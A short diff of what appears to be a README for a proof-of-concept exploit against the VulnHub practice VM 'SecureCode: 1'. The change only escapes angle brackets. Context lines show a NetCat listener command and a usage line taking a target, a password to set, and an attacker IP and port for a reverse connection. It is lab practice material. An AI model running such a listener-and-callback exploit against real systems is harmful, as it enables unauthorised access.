@@ -7,7 +7,7 @@ Link to vulernable VM: https://www.vulnhub.com/entry/securecode-1,651/
 start a NetCat listener with:
  nc -nlvp <IP> <port>
 
-usage: python3 poc.py -t <target> -p <password to set> -i <attacker IP> -pt <attacker port>
+usage: python3 poc.py -t \<target\> -p <password to set> -i <attacker IP> -pt <attacker port>
  
  Explaination of script below contains spoilers, read/use only if stuck.
   
